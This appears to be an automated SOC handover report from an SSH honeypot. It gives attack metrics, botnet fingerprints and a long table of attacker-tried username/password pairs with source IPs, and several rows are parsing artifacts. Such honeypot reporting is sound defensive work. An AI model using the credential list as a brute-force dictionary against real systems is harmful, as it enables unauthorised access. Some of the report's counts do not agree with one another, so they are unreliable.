# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-30 |
| **Generated At** | 2026-08-30T16:21:27Z |
| **Shift Time** | 16:21 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **416** |
| Confirmed Threats | **384** |
| False Positives Filtered | **32** (7.7%) |
| Unique Attacker IPs | **136** |
| Countries of Origin | **42** |
| High Severity Cases | **327** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **89** |
| Malware Samples Analyzed | **3** HIGH · **20** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **378** |
| Unique Credential Pairs | **259** |
| Unique Usernames | **86** |
| Unique Passwords | **180** |
| Successful Auth Pairs | **352** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `ubuntu` | 34 |
| `support` | 33 |
| `ubnt` | 27 |
| `admin` | 19 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 15 |
| `123` | 11 |
| `1234` | 10 |
| `7777777` | 10 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 7 |
| `ubnt` | `6666666` | 6 |
| `operator` | `operator555` | 6 |
| `centos` | `centos666` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `123456Ab` | `217.60.255.130` | 2026-08-30T10:56:20 |
| `root` | `data2025` | `217.60.255.130` | 2026-08-30T10:56:50 |
| `user` | `7` | `60.214.127.246` | 2026-08-30T10:58:20 |
| `ubnt` | `6666666` | `10.0.0.73` | 2026-08-30T11:02:08 |
| `ubnt` | `6666666` | `218.22.0.200` | 2026-08-30T11:03:43 |
| `ubnt` | `6666666` | `207.219.222.29` | 2026-08-30T11:03:52 |
| `ubuntu` | `Abc12345678` | `217.60.255.130` | 2026-08-30T11:05:56 |
| `root` | `poiuyt` | `217.60.255.130` | 2026-08-30T11:07:40 |
| `user` | `7` | `10.0.0.73` | 2026-08-30T11:09:03 |
| `operator` | `operator555` | `10.0.0.73` | 2026-08-30T11:09:30 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-08-30T11:10:03 |
| `support` | `support` | `176.53.159.196` | 2026-08-30T11:13:40 |
| `ubuntu` | `Abcd.1234` | `217.60.255.130` | 2026-08-30T11:15:27 |
| `root` | `passer` | `217.60.255.130` | 2026-08-30T11:18:18 |
| `ubnt` | `6666666` | `178.178.194.128` | 2026-08-30T11:18:36 |
| `ubnt` | `6666666` | `186.239.41.74` | 2026-08-30T11:18:53 |
| `POST /login HTTP/1.1` | `Host: 129.80.119.236:2323` | `222.129.37.110` | 2026-08-30T11:23:28 |
| `ubuntu` | `Tt123456` | `217.60.255.130` | 2026-08-30T11:24:55 |
| `user` | `7` | `123.52.202.92` | 2026-08-30T11:25:09 |
| `root` | `debian` | `180.76.112.91` | 2026-08-30T11:25:55 |
| `operator` | `operator555` | `118.91.176.243` | 2026-08-30T11:26:37 |
| `operator` | `operator555` | `50.188.204.213` | 2026-08-30T11:26:46 |
| `operator` | `operator555` | `213.101.138.172` | 2026-08-30T11:26:48 |
| `operator` | `operator555` | `183.233.85.194` | 2026-08-30T11:26:57 |
| `root` | `P@ssw0rd.123` | `217.60.255.130` | 2026-08-30T11:29:07 |
| `root` | `Windows1` | `66.116.234.172` | 2026-08-30T11:29:38 |
| `345gs5662d34` | `345gs5662d34` | `66.116.234.172` | 2026-08-30T11:29:42 |
| `root` | `3245gs5662d34` | `66.116.234.172` | 2026-08-30T11:29:44 |
| `support` | `8888` | `94.202.13.224` | 2026-08-30T11:30:05 |
| `support` | `8888` | `213.230.64.246` | 2026-08-30T11:30:13 |
| `root` | `12211221` | `103.160.213.140` | 2026-08-30T11:30:29 |
| `345gs5662d34` | `345gs5662d34` | `103.160.213.140` | 2026-08-30T11:30:33 |
| `root` | `3245gs5662d34` | `103.160.213.140` | 2026-08-30T11:30:35 |
| `ndd` | `ndd` | `159.65.2.17` | 2026-08-30T11:32:02 |
| `345gs5662d34` | `345gs5662d34` | `159.65.2.17` | 2026-08-30T11:32:06 |
| `ndd` | `3245gs5662d34` | `159.65.2.17` | 2026-08-30T11:32:08 |
| `root` | `Yr123456` | `103.167.89.222` | 2026-08-30T11:33:10 |
| `345gs5662d34` | `345gs5662d34` | `103.167.89.222` | 2026-08-30T11:33:15 |
| `root` | `3245gs5662d34` | `103.167.89.222` | 2026-08-30T11:33:16 |
| `centos` | `centos666` | `10.0.0.73` | 2026-08-30T11:33:51 |
| `ubuntu` | `Hello.123` | `217.60.255.130` | 2026-08-30T11:34:25 |
| `centos` | `centos666` | `78.187.9.53` | 2026-08-30T11:35:24 |
| `centos` | `centos666` | `219.73.79.33` | 2026-08-30T11:35:32 |
| `root` | `ADMIN123` | `217.60.255.130` | 2026-08-30T11:39:57 |
| `ubnt` | `9` | `10.0.0.73` | 2026-08-30T11:41:17 |
| `ubuntu` | `Aa12345` | `217.60.255.130` | 2026-08-30T11:44:07 |
| `centos` | `centos666` | `203.192.247.84` | 2026-08-30T11:50:20 |
| `centos` | `centos666` | `182.76.36.62` | 2026-08-30T11:50:29 |
| `root` | `Lucas@123` | `217.60.255.130` | 2026-08-30T11:50:36 |
| `ubuntu` | `Qq123123` | `217.60.255.130` | 2026-08-30T11:53:28 |
| `support` | `8888` | `43.245.85.2` | 2026-08-30T11:57:06 |
| `support` | `8888` | `221.182.185.190` | 2026-08-30T11:57:15 |
| `support` | `support` | `10.0.0.73` | 2026-08-30T11:57:52 |
| `ubnt` | `9` | `65.20.204.254` | 2026-08-30T11:58:37 |
| `ubnt` | `9` | `171.8.42.112` | 2026-08-30T11:58:51 |
| `ubnt` | `9` | `213.149.216.10` | 2026-08-30T11:58:59 |
| `solana` | `solana` | `2.57.122.53` | 2026-08-30T12:00:35 |
| `root` | `Qwerty!123` | `217.60.255.130` | 2026-08-30T12:01:23 |
| `ubuntu` | `ubuntu` | `2.57.122.53` | 2026-08-30T12:02:58 |
| `ubuntu` | `Aa123654` | `217.60.255.130` | 2026-08-30T12:03:05 |
| `root` | `123` | `92.118.39.71` | 2026-08-30T12:03:44 |
| `sol` | `sol` | `2.57.122.53` | 2026-08-30T12:05:12 |
| `root` | `1234` | `92.118.39.71` | 2026-08-30T12:05:31 |
| `root` | `12345` | `92.118.39.71` | 2026-08-30T12:07:18 |
| `ubuntu` | `123456` | `2.57.122.53` | 2026-08-30T12:07:23 |
| `maarch` | `123456` | `188.20.244.19` | 2026-08-30T12:07:53 |
| `345gs5662d34` | `345gs5662d34` | `188.20.244.19` | 2026-08-30T12:07:55 |
| `maarch` | `3245gs5662d34` | `188.20.244.19` | 2026-08-30T12:07:56 |
| `sol` | `sol123` | `2.57.122.53` | 2026-08-30T12:09:34 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-30T12:10:02 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-30T12:10:05 |
| `rocky` | `P@ssw0rd123` | `88.147.30.59` | 2026-08-30T12:10:45 |
| `345gs5662d34` | `345gs5662d34` | `88.147.30.59` | 2026-08-30T12:10:48 |
| `rocky` | `3245gs5662d34` | `88.147.30.59` | 2026-08-30T12:10:49 |
| `root` | `1234567` | `92.118.39.71` | 2026-08-30T12:10:56 |
| `sol` | `123` | `2.57.122.53` | 2026-08-30T12:11:40 |
| `root` | `linux` | `217.60.255.130` | 2026-08-30T12:12:16 |
| `ubuntu` | `163.com` | `217.60.255.130` | 2026-08-30T12:12:41 |
| `root` | `12345678` | `92.118.39.71` | 2026-08-30T12:12:45 |
| `root` | `222` | `10.0.0.73` | 2026-08-30T12:13:03 |
| `test` | `44` | `10.0.0.73` | 2026-08-30T12:13:13 |
| `eth-docker` | `eth-docker` | `2.57.122.53` | 2026-08-30T12:13:48 |
| `root` | `123456789` | `92.118.39.71` | 2026-08-30T12:14:28 |
| `ethdocker` | `ethdocker` | `2.57.122.53` | 2026-08-30T12:16:06 |
| `root` | `1234567890` | `92.118.39.71` | 2026-08-30T12:16:17 |
| `root` | `123abc` | `92.118.39.71` | 2026-08-30T12:18:02 |
| `ethd` | `ethd` | `2.57.122.53` | 2026-08-30T12:18:20 |
| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-08-30T12:19:49 |
| `firedancer` | `firedancer123` | `2.57.122.53` | 2026-08-30T12:20:38 |
| `root` | `P@ssw0rd123` | `92.118.39.71` | 2026-08-30T12:21:42 |
| `ubuntu` | `Qwer123456` | `217.60.255.130` | 2026-08-30T12:22:03 |
| `test` | `111111` | `36.137.38.119` | 2026-08-30T12:22:21 |
| `root` | `Drs123` | `217.60.255.130` | 2026-08-30T12:22:50 |
| `lab` | `lab` | `2.57.122.53` | 2026-08-30T12:22:55 |
| `root` | `abc123` | `92.118.39.71` | 2026-08-30T12:23:35 |
| `www-data` | `12345678` | `185.138.89.72` | 2026-08-30T12:23:40 |
| `345gs5662d34` | `345gs5662d34` | `185.138.89.72` | 2026-08-30T12:23:42 |
| `www-data` | `3245gs5662d34` | `185.138.89.72` | 2026-08-30T12:23:42 |
| `ubuntu` | `Aa134679` | `65.181.127.40` | 2026-08-30T12:23:59 |
| `345gs5662d34` | `345gs5662d34` | `65.181.127.40` | 2026-08-30T12:24:00 |
| `ubuntu` | `3245gs5662d34` | `65.181.127.40` | 2026-08-30T12:24:01 |
| `root` | `Alibaba@123` | `20.157.117.15` | 2026-08-30T12:24:15 |
| `345gs5662d34` | `345gs5662d34` | `20.157.117.15` | 2026-08-30T12:24:19 |
| `root` | `3245gs5662d34` | `20.157.117.15` | 2026-08-30T12:24:21 |
| `lab` | `lab@123` | `2.57.122.53` | 2026-08-30T12:25:02 |
| `root` | `admin123` | `92.118.39.71` | 2026-08-30T12:25:27 |
| `lab` | `lab123` | `2.57.122.53` | 2026-08-30T12:27:15 |
| `root` | `letmein` | `92.118.39.71` | 2026-08-30T12:27:21 |
| `root` | `pass123` | `92.118.39.71` | 2026-08-30T12:29:13 |
| `root` | `222` | `218.58.73.238` | 2026-08-30T12:29:18 |
| `root` | `222` | `220.246.66.209` | 2026-08-30T12:29:27 |
| `user` | `1` | `2.57.122.53` | 2026-08-30T12:29:30 |
| `test` | `44` | `220.93.167.144` | 2026-08-30T12:30:50 |
| `test` | `44` | `31.59.89.50` | 2026-08-30T12:30:55 |
| `test` | `44` | `113.200.216.246` | 2026-08-30T12:31:01 |
| `root` | `password` | `92.118.39.71` | 2026-08-30T12:31:04 |
| `test` | `44` | `220.246.46.144` | 2026-08-30T12:31:08 |
| `ubuntu` | `1Qazxsw2` | `217.60.255.130` | 2026-08-30T12:31:35 |
| `user` | `1234` | `2.57.122.53` | 2026-08-30T12:31:42 |
| `root` | `password1` | `92.118.39.71` | 2026-08-30T12:32:55 |
| `webmail` | `webmail` | `101.126.71.100` | 2026-08-30T12:32:58 |
| `345gs5662d34` | `345gs5662d34` | `101.126.71.100` | 2026-08-30T12:33:02 |
| `webmail` | `3245gs5662d34` | `101.126.71.100` | 2026-08-30T12:33:04 |
| `root` | `asdasd123` | `217.60.255.130` | 2026-08-30T12:33:37 |
| `radar` | `radar` | `2.57.122.53` | 2026-08-30T12:34:04 |
| `root` | `qwerty123` | `92.118.39.71` | 2026-08-30T12:34:56 |
| `postfix` | `postfix` | `2.57.122.53` | 2026-08-30T12:36:23 |
| `root` | `root123` | `92.118.39.71` | 2026-08-30T12:36:49 |
| `support` | `333` | `10.0.0.73` | 2026-08-30T12:37:17 |
| `airflow` | `airflow` | `2.57.122.53` | 2026-08-30T12:38:36 |
| `root` | `welcome` | `92.118.39.71` | 2026-08-30T12:38:39 |
| `admin` | `123` | `92.118.39.71` | 2026-08-30T12:40:21 |
| `pgsql` | `pgsql` | `2.57.122.53` | 2026-08-30T12:40:54 |
| `ubuntu` | `Welcome123456` | `217.60.255.130` | 2026-08-30T12:41:08 |
| `admin` | `1234` | `92.118.39.71` | 2026-08-30T12:42:08 |
| `ethereumdocker` | `ethereumdocker` | `2.57.122.53` | 2026-08-30T12:43:09 |
| `admin` | `12345` | `92.118.39.71` | 2026-08-30T12:43:58 |
| `root` | `Admin123.` | `217.60.255.130` | 2026-08-30T12:44:14 |
| `ubnt` | `555555` | `10.0.0.73` | 2026-08-30T12:45:03 |
| `support` | `666` | `10.0.0.73` | 2026-08-30T12:45:15 |
| `docker` | `ethereum` | `2.57.122.53` | 2026-08-30T12:45:23 |
| `admin` | `123456` | `92.118.39.71` | 2026-08-30T12:45:52 |
| `firedancer` | `firedancer` | `2.57.122.53` | 2026-08-30T12:47:43 |
| `admin` | `1234567` | `92.118.39.71` | 2026-08-30T12:47:49 |
| `admin` | `12345678` | `92.118.39.71` | 2026-08-30T12:49:41 |
| `ubuntu` | `qwer1234` | `2.57.122.53` | 2026-08-30T12:50:01 |
| `ubuntu` | `asdfg.123456` | `217.60.255.130` | 2026-08-30T12:50:31 |
| `admin` | `123456789` | `92.118.39.71` | 2026-08-30T12:51:25 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `157.245.241.15` | 2026-08-30T12:51:47 |
| `*1` | `$4` | `157.245.241.15` | 2026-08-30T12:51:48 |
| `fox a 1 -1 fox hello` | `{` | `157.245.241.15` | 2026-08-30T12:51:49 |
| `ubuntu` | `1234qwer` | `2.57.122.53` | 2026-08-30T12:52:22 |
| `admin` | `1234567890` | `92.118.39.71` | 2026-08-30T12:53:03 |
| `support` | `333` | `121.167.110.137` | 2026-08-30T12:54:04 |
| `support` | `333` | `119.160.166.237` | 2026-08-30T12:54:18 |
| `admin` | `1q2w3e4r` | `92.118.39.71` | 2026-08-30T12:54:42 |
| `raydium` | `raydium` | `2.57.122.53` | 2026-08-30T12:54:45 |
| `root` | `admin@888` | `217.60.255.130` | 2026-08-30T12:55:06 |
| `admin` | `P@ssw0rd123` | `92.118.39.71` | 2026-08-30T12:56:25 |
| `admin` | `abc123` | `92.118.39.71` | 2026-08-30T12:58:11 |
| `anza` | `anza` | `2.57.122.53` | 2026-08-30T12:59:19 |
| `admin` | `admin123` | `92.118.39.71` | 2026-08-30T13:00:06 |
| `ubuntu` | `passw0rd!@` | `217.60.255.130` | 2026-08-30T13:00:11 |
| `ubnt` | `555555` | `31.173.29.136` | 2026-08-30T13:01:23 |
| `ubnt` | `555555` | `24.142.170.231` | 2026-08-30T13:01:30 |
| `bittensor` | `bittensor` | `2.57.122.53` | 2026-08-30T13:01:36 |
| `admin` | `letmein` | `92.118.39.71` | 2026-08-30T13:01:58 |
| `support` | `666` | `182.95.186.182` | 2026-08-30T13:02:41 |
| `support` | `666` | `217.100.184.50` | 2026-08-30T13:02:49 |
| `support` | `666` | `71.229.1.186` | 2026-08-30T13:02:53 |
| `massa` | `massa` | `2.57.122.53` | 2026-08-30T13:03:51 |
| `admin` | `pass123` | `92.118.39.71` | 2026-08-30T13:03:53 |
| `admin` | `password` | `92.118.39.71` | 2026-08-30T13:05:53 |
| `root` | `praxis` | `217.60.255.130` | 2026-08-30T13:05:55 |
| `root` | `root55` | `49.205.214.47` | 2026-08-30T13:06:11 |
| `avalanche` | `avalanche` | `2.57.122.53` | 2026-08-30T13:06:17 |
| `ubuntu` | `ubuntu` | `20.193.153.215` | 2026-08-30T13:07:28 |
| `admin` | `password1` | `92.118.39.71` | 2026-08-30T13:07:38 |
| `moonbeam` | `moonbeam` | `2.57.122.53` | 2026-08-30T13:08:42 |
| `admin` | `qwerty123` | `92.118.39.71` | 2026-08-30T13:09:17 |
| `config` | `config111` | `10.0.0.73` | 2026-08-30T13:09:23 |
| `ubuntu` | `Atieh@123` | `217.60.255.130` | 2026-08-30T13:09:42 |
| `config` | `config111` | `211.53.58.10` | 2026-08-30T13:10:44 |
| `config` | `config111` | `220.116.113.35` | 2026-08-30T13:10:53 |
| `admin` | `root123` | `92.118.39.71` | 2026-08-30T13:11:01 |
| `beam` | `beam` | `2.57.122.53` | 2026-08-30T13:11:05 |
| `root` | `123456qW` | `10.0.0.73` | 2026-08-30T13:11:18 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-08-30T13:11:21 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-08-30T13:11:23 |
| `root/1` | `123` | `150.136.176.163` | 2026-08-30T13:11:59 |
| `345gs5662d34` | `345gs5662d34` | `150.136.176.163` | 2026-08-30T13:12:00 |
| `root/1` | `3245gs5662d34` | `150.136.176.163` | 2026-08-30T13:12:00 |
| `admin1` | `123` | `92.118.39.71` | 2026-08-30T13:12:53 |
| `noc` | `noc` | `2.57.122.53` | 2026-08-30T13:13:29 |
| `admin1` | `1234` | `92.118.39.71` | 2026-08-30T13:14:50 |
| `nxt` | `nxt` | `2.57.122.53` | 2026-08-30T13:15:45 |
| `root` | `ftpuser123!` | `217.60.255.130` | 2026-08-30T13:16:24 |
| `admin1` | `admin123` | `92.118.39.71` | 2026-08-30T13:16:48 |
| `root` | `root55` | `10.0.0.73` | 2026-08-30T13:17:07 |
| `test` | `3333` | `10.0.0.73` | 2026-08-30T13:17:23 |
| `ubuntu` | `4rfv$RFV` | `2.57.122.53` | 2026-08-30T13:18:05 |
| `admin1` | `password1` | `92.118.39.71` | 2026-08-30T13:18:41 |
| `ubuntu` | `Aseman@123` | `217.60.255.130` | 2026-08-30T13:19:03 |
| `admin1` | `qwerty123` | `92.118.39.71` | 2026-08-30T13:20:22 |
| `test` | `testing@123` | `2.57.122.53` | 2026-08-30T13:20:30 |
| `administrator` | `123` | `92.118.39.71` | 2026-08-30T13:22:04 |
| `server` | `server` | `2.57.122.53` | 2026-08-30T13:22:54 |
| `administrator` | `1234` | `92.118.39.71` | 2026-08-30T13:23:50 |
| `server` | `server@123` | `2.57.122.53` | 2026-08-30T13:25:25 |
| `administrator` | `123abc` | `92.118.39.71` | 2026-08-30T13:25:47 |
| `config` | `config111` | `95.79.57.221` | 2026-08-30T13:25:53 |
| `config` | `config111` | `116.48.143.166` | 2026-08-30T13:26:08 |
| `root` | `master#2025` | `217.60.255.130` | 2026-08-30T13:27:22 |
| `administrator` | `1q2w3e4r` | `92.118.39.71` | 2026-08-30T13:27:38 |
| `exx` | `exx@123` | `2.57.122.53` | 2026-08-30T13:27:49 |
| `ubuntu` | `Exir@123` | `217.60.255.130` | 2026-08-30T13:28:41 |
| `administrator` | `admin123` | `92.118.39.71` | 2026-08-30T13:29:34 |
| `rosmadinor` | `rosmadinor` | `2.57.122.53` | 2026-08-30T13:30:10 |
| `administrator` | `qwerty123` | `92.118.39.71` | 2026-08-30T13:31:32 |
| `apache` | `1234` | `92.118.39.71` | 2026-08-30T13:33:21 |
| `root` | `root55` | `81.215.2.43` | 2026-08-30T13:33:38 |
| `root` | `root55` | `200.89.159.59` | 2026-08-30T13:33:46 |
| `konica` | `konica` | `2.57.122.53` | 2026-08-30T13:34:55 |
| `backup` | `123` | `92.118.39.71` | 2026-08-30T13:34:59 |
| `test` | `3333` | `60.251.229.144` | 2026-08-30T13:34:59 |
| `test` | `3333` | `187.49.63.41` | 2026-08-30T13:35:07 |
| `test` | `3333` | `39.164.91.67` | 2026-08-30T13:35:16 |
| `backup` | `12345678` | `92.118.39.71` | 2026-08-30T13:36:41 |
| `justin` | `justin` | `2.57.122.53` | 2026-08-30T13:37:23 |
| `root` | `xxx` | `217.60.255.130` | 2026-08-30T13:38:12 |
| `backup` | `password` | `92.118.39.71` | 2026-08-30T13:38:19 |
| `ubuntu` | `qq123456789` | `217.60.255.130` | 2026-08-30T13:38:19 |
| `support` | `7777777` | `103.251.143.14` | 2026-08-30T13:38:31 |
| `support` | `7777777` | `196.188.93.169` | 2026-08-30T13:38:39 |
| `sybase` | `sybase` | `2.57.122.53` | 2026-08-30T13:39:53 |
| `daemon` | `123456` | `92.118.39.71` | 2026-08-30T13:39:58 |
| `ubnt` | `ubnt888` | `10.0.0.73` | 2026-08-30T13:41:12 |
| `daemon` | `abc123` | `92.118.39.71` | 2026-08-30T13:41:36 |
| `delta` | `delta` | `2.57.122.53` | 2026-08-30T13:42:19 |
| `ubnt` | `ubnt888` | `112.26.99.93` | 2026-08-30T13:42:47 |
| `ubnt` | `ubnt888` | `14.33.96.3` | 2026-08-30T13:42:58 |
| `debian` | `123` | `92.118.39.71` | 2026-08-30T13:43:16 |
| `sniping` | `sniping` | `2.57.122.53` | 2026-08-30T13:44:49 |
| `debian` | `1234` | `92.118.39.71` | 2026-08-30T13:44:59 |
| `debian` | `12345` | `92.118.39.71` | 2026-08-30T13:46:41 |
| `super` | `super` | `2.57.122.53` | 2026-08-30T13:47:12 |
| `ubuntu` | `Qwe123456` | `217.60.255.130` | 2026-08-30T13:47:41 |
| `debian` | `123456` | `92.118.39.71` | 2026-08-30T13:48:21 |
| `root` | `mario1` | `186.158.183.66` | 2026-08-30T13:48:24 |
| `345gs5662d34` | `345gs5662d34` | `186.158.183.66` | 2026-08-30T13:48:30 |
| `root` | `3245gs5662d34` | `186.158.183.66` | 2026-08-30T13:48:32 |
| `root` | `!Admin1234` | `217.60.255.130` | 2026-08-30T13:48:51 |
| `support` | `7777777` | `10.0.0.73` | 2026-08-30T13:49:26 |
| `sniper-bot` | `sniper-bot` | `2.57.122.53` | 2026-08-30T13:49:37 |
| `ubnt` | `7777777` | `10.0.0.73` | 2026-08-30T13:49:39 |
| `debian` | `12345678` | `92.118.39.71` | 2026-08-30T13:50:03 |
| `debian` | `123456789` | `92.118.39.71` | 2026-08-30T13:51:47 |
| `sniper` | `sniper` | `2.57.122.53` | 2026-08-30T13:52:04 |
| `debian` | `1234567890` | `92.118.39.71` | 2026-08-30T13:53:28 |
| `eve` | `eve` | `2.57.122.53` | 2026-08-30T13:54:29 |
| `debian` | `1q2w3e4r` | `92.118.39.71` | 2026-08-30T13:55:12 |
| `ripple` | `ripple` | `2.57.122.53` | 2026-08-30T13:57:01 |
| `debian` | `abc123` | `92.118.39.71` | 2026-08-30T13:57:01 |
| `ubuntu` | `abc@12345` | `217.60.255.130` | 2026-08-30T13:57:16 |
| `ubnt` | `ubnt888` | `58.57.154.146` | 2026-08-30T13:57:47 |
| `ubnt` | `ubnt888` | `212.174.62.233` | 2026-08-30T13:57:57 |
| `debian` | `admin123` | `92.118.39.71` | 2026-08-30T13:58:49 |
| `node` | `1234` | `2.57.122.53` | 2026-08-30T13:59:33 |
| `root` | `admin#1` | `217.60.255.130` | 2026-08-30T13:59:37 |
| `debian` | `letmein` | `92.118.39.71` | 2026-08-30T14:00:35 |
| `node` | `123456` | `2.57.122.53` | 2026-08-30T14:02:03 |
| `debian` | `pass123` | `92.118.39.71` | 2026-08-30T14:02:21 |
| `debian` | `password` | `92.118.39.71` | 2026-08-30T14:04:10 |
| `xrpl` | `xrpl` | `2.57.122.53` | 2026-08-30T14:04:34 |
| `support` | `7777777` | `217.211.15.160` | 2026-08-30T14:05:38 |
| `support` | `7777777` | `70.183.235.233` | 2026-08-30T14:05:45 |
| `debian` | `qwerty123` | `92.118.39.71` | 2026-08-30T14:05:56 |
| `ubuntu` | `@admin123` | `217.60.255.130` | 2026-08-30T14:06:48 |
| `claude` | `claude` | `2.57.122.53` | 2026-08-30T14:06:57 |
| `ubnt` | `7777777` | `182.75.197.174` | 2026-08-30T14:07:19 |
| `ubnt` | `7777777` | `178.224.53.154` | 2026-08-30T14:07:27 |
| `deploy` | `123` | `92.118.39.71` | 2026-08-30T14:07:36 |
| `deploy` | `1234` | `92.118.39.71` | 2026-08-30T14:09:16 |
| `codex` | `codex` | `2.57.122.53` | 2026-08-30T14:09:26 |
| `root` | `Abc123654` | `217.60.255.130` | 2026-08-30T14:10:17 |
| `guest` | `guest444` | `81.228.174.248` | 2026-08-30T14:10:39 |
| `guest` | `guest444` | `186.238.242.194` | 2026-08-30T14:10:47 |
| `deploy` | `1234567890` | `92.118.39.71` | 2026-08-30T14:10:56 |
| `gemini` | `gemini` | `2.57.122.53` | 2026-08-30T14:11:56 |
| `deploy` | `1q2w3e4r` | `92.118.39.71` | 2026-08-30T14:12:39 |
| `support` | `000` | `10.0.0.73` | 2026-08-30T14:13:13 |
| `deploy` | `admin123` | `92.118.39.71` | 2026-08-30T14:14:19 |
| `validate` | `validate` | `2.57.122.53` | 2026-08-30T14:14:30 |
| `support` | `000` | `109.233.21.109` | 2026-08-30T14:14:43 |
| `support` | `000` | `59.188.114.121` | 2026-08-30T14:14:50 |
| `deploy` | `pass123` | `92.118.39.71` | 2026-08-30T14:15:57 |
| `ubuntu` | `qwer1234!@#$` | `217.60.255.130` | 2026-08-30T14:16:17 |
| `deepseek` | `deepseek` | `2.57.122.53` | 2026-08-30T14:17:11 |
| `deploy` | `password1` | `92.118.39.71` | 2026-08-30T14:17:37 |
| `deploy` | `qwerty123` | `92.118.39.71` | 2026-08-30T14:19:17 |
| `xrp` | `xrp` | `2.57.122.53` | 2026-08-30T14:19:41 |
| `root` | `rootroot` | `217.60.255.130` | 2026-08-30T14:21:10 |
| `guest` | `guest444` | `10.0.0.73` | 2026-08-30T14:21:42 |
| `devuser` | `devuser` | `2.57.122.53` | 2026-08-30T14:22:13 |
| `vyos` | `vyos` | `2.57.122.53` | 2026-08-30T14:24:42 |
| `ubuntu` | `Aa123456789!` | `217.60.255.130` | 2026-08-30T14:25:54 |
| `harmony` | `harmony` | `2.57.122.53` | 2026-08-30T14:27:12 |
| `pool` | `pool` | `2.57.122.53` | 2026-08-30T14:29:51 |
| `support` | `000` | `211.253.10.61` | 2026-08-30T14:29:59 |
| `support` | `000` | `103.147.248.23` | 2026-08-30T14:30:09 |
| `root` | `abc123` | `10.0.0.73` | 2026-08-30T14:31:37 |
| `root` | `P@ss12345` | `217.60.255.130` | 2026-08-30T14:31:53 |
| `tt` | `tt` | `2.57.122.53` | 2026-08-30T14:32:24 |
| `sol` | `sol` | `2.57.122.238` | 2026-08-30T14:33:19 |
| `vyatta` | `vyatta` | `2.57.122.53` | 2026-08-30T14:35:00 |
| `solana` | `solana` | `2.57.122.238` | 2026-08-30T14:35:12 |
| `wireguard` | `123` | `10.0.0.73` | 2026-08-30T14:35:15 |
| `ubuntu` | `1q2w3e4R` | `217.60.255.130` | 2026-08-30T14:35:24 |
| `wireguard` | `3245gs5662d34` | `10.0.0.73` | 2026-08-30T14:35:25 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-08-30T14:37:00 |
| `root` | `Aa@123456` | `2.57.122.53` | 2026-08-30T14:37:30 |
| `guest` | `guest444` | `111.70.32.53` | 2026-08-30T14:38:00 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-08-30T14:38:47 |
| `root` | `3333333` | `196.190.180.18` | 2026-08-30T14:39:49 |
| `root` | `3333333` | `60.214.127.246` | 2026-08-30T14:39:59 |
| `root` | `3333333` | `171.8.42.112` | 2026-08-30T14:40:00 |
| `xiwen` | `xiwen` | `2.57.122.53` | 2026-08-30T14:40:01 |
| `root` | `3333333` | `103.93.37.178` | 2026-08-30T14:40:09 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-08-30T14:40:29 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-08-30T14:42:13 |
| `leaf` | `leaf` | `2.57.122.53` | 2026-08-30T14:42:38 |
| `root` | `Sec@123` | `217.60.255.130` | 2026-08-30T14:42:43 |
| `ubnt` | `4444444` | `45.178.227.0` | 2026-08-30T14:43:03 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-08-30T14:43:46 |
| `ubuntu` | `abc@123456` | `217.60.255.130` | 2026-08-30T14:44:54 |
| `root` | `1qaz@WSX` | `2.57.122.53` | 2026-08-30T14:45:13 |
| `node` | `node` | `2.57.122.238` | 2026-08-30T14:45:17 |
| `support` | `999999` | `10.0.0.73` | 2026-08-30T14:45:23 |
| `support` | `999999` | `61.185.30.170` | 2026-08-30T14:46:45 |
| `node` | `1234` | `2.57.122.238` | 2026-08-30T14:46:51 |
| `support` | `999999` | `116.72.9.151` | 2026-08-30T14:46:54 |
| `admin` | `ubuntu@123` | `2.57.122.53` | 2026-08-30T14:47:54 |
| `node` | `123456` | `2.57.122.238` | 2026-08-30T14:48:29 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-08-30T14:50:08 |
| `zhenshan` | `zhenshan` | `2.57.122.53` | 2026-08-30T14:50:28 |
| `eth` | `eth` | `2.57.122.238` | 2026-08-30T14:51:47 |
| `centos` | `123` | `2.57.122.53` | 2026-08-30T14:53:03 |
| `root` | `Secure@123` | `217.60.255.130` | 2026-08-30T14:53:29 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-08-30T14:53:31 |
| `ubnt` | `4444444` | `10.0.0.73` | 2026-08-30T14:54:07 |
| `ubuntu` | `Pass@word` | `217.60.255.130` | 2026-08-30T14:54:32 |
| `operator` | `operator2002` | `10.0.0.73` | 2026-08-30T14:54:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **416** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 171 |
| libssh | 99 |
| OpenSSH | 71 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 87 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 77 | 1 |
